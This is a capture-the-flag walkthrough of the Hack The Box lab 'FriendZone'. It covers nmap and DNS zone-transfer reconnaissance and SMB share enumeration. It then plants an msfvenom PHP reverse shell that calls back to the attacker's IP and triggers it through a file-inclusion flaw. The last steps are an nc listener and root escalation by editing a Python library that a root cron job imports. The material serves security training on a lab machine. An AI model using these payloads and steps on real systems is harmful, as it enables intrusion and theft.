# FriendZone

FriendZone is a easy HTB lab that focuses on DNS enumeration, injection payloads and privilege escalation. In this walkthrough, we will go over the process of exploiting the services and gaining access to the root user.

### Recon
The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.

```
$ sudo nmap -p- -sV -sC 10.129.41.205

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-10 22:44 GMT
Nmap scan report for 10.129.41.205
Host is up (0.092s latency).
Not shown: 65528 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA)
|   256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA)
|_  256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_http-title: 404 Not Found
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-01-10T22:46:26
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2024-01-11T00:46:26+02:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.91 seconds
```

Got following email `info@friendzoneportal.red` from the website.

Based on this and the nmap output, let's check we can get more domains with zone transfer.
```
$ dig axfr friendzone.red @10.129.41.205

; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> axfr friendzone.red @10.129.41.205
;; global options: +cmd
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.		604800	IN	AAAA	::1
friendzone.red.		604800	IN	NS	localhost.
friendzone.red.		604800	IN	A	127.0.0.1
administrator1.friendzone.red. 604800 IN A	127.0.0.1
hr.friendzone.red.	604800	IN	A	127.0.0.1
uploads.friendzone.red.	604800	IN	A	127.0.0.1
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 89 msec
;; SERVER: 10.129.41.205#53(10.129.41.205) (TCP)
;; WHEN: Wed Jan 10 22:57:36 GMT 2024
;; XFR size: 8 records (messages 1, bytes 289)
```

Adding new domains found to `/etc/hosts`.
```
sudo tee --append /etc/hosts <<< "10.129.41.205 uploads.friendzone.red hr.friendzone.red administrator1.friendzone.red friendzone.red"
```

Enumerating the SMB shares:
```
IP=10.129.41.205;
$ sudo crackmapexec smb $IP -u '' -p '' --shares;

SMB         10.129.41.205   445    FRIENDZONE       [*] Windows 6.1 (name:FRIENDZONE) (domain:) (signing:False) (SMBv1:True)
SMB         10.129.41.205   445    FRIENDZONE       [+] \: 
SMB         10.129.41.205   445    FRIENDZONE       [+] Enumerated shares
SMB         10.129.41.205   445    FRIENDZONE       Share           Permissions     Remark
SMB         10.129.41.205   445    FRIENDZONE       -----           -----------     ------
SMB         10.129.41.205   445    FRIENDZONE       print$                          Printer Drivers
SMB         10.129.41.205   445    FRIENDZONE       Files                           FriendZone Samba Server Files /etc/Files
SMB         10.129.41.205   445    FRIENDZONE       general         READ            FriendZone Samba Server Files
SMB         10.129.41.205   445    FRIENDZONE       Development     READ,WRITE      FriendZone Samba Server Files
SMB         10.129.41.205   445    FRIENDZONE       IPC$                            IPC Service (FriendZone server (Samba, Ubuntu))
```

Reading the data present in `general` SMB share.
```
$ sudo smbclient -N \\\\$IP\\general -U '';
smb: \> get creds.txt
```

Reading the `creds.txt` from the SMB share.
```
$ cat creds.txt 
creds for the admin THING:

admin:WORKWORKH*********@#
```

`https://administrator1.friendzone.red/` has login screen where we can use this credentials. After that we find different urls but finally we got injection using https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp and https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=login.

### User

Preparing the reverse shell that we can put in the Development SMB which we have write access on.

```
$ msfvenom -p php/reverse_php LHOST=10.10.14.140 LPORT=4444 -f raw > rev_shell.php

$ sudo smbclient -N \\\\10.129.41.234\\development -U 'admin%WORKWORKH*********@#';
smb> put rev_shell.php
```
Opening the pages https://administrator1.friendzone.red/dashboard.php?image_id=../../../Development/c.jpg&pagename=/etc/Development/rev_shell gives reverse shell.

```
$ nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.41.234.
Ncat: Connection from 10.129.41.234:52164.
id   
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Getting information availabe to us:
```
$ cat mysql_data.conf

for development process this is the mysql creds for user friend
db_user=friend
db_pass=*********!0.213$
db_name=FZ
```

Logging in with credentials provided and getting the user flag:
```
$ ssh friend@10.129.41.234
*********!0.213$

$ cat user.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```

### Privilege Escalation

Investigating using `pspy`, we can find that root is actually invoking the `reporter.py` file.

```
2024/01/11 05:00:01 CMD: UID=0     PID=17332  | /usr/bin/python /opt/server_admin/reporter.py 
2024/01/11 05:00:01 CMD: UID=0     PID=17331  | /bin/sh -c /opt/server_admin/reporter.py 
2024/01/11 05:00:01 CMD: UID=0     PID=17330  | /usr/sbin/CRON -f 
```

using `linpeas.sh` we found that apart from the files in the share we have /usr/lib/python2.7/os.py. 

Updated the code in `/usr/lib/python2.7/os.py` to execute `system("cp /root/root.txt /home/friend/dummy.txt")`

Getting the flag:
```
~$ cat dummy.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```
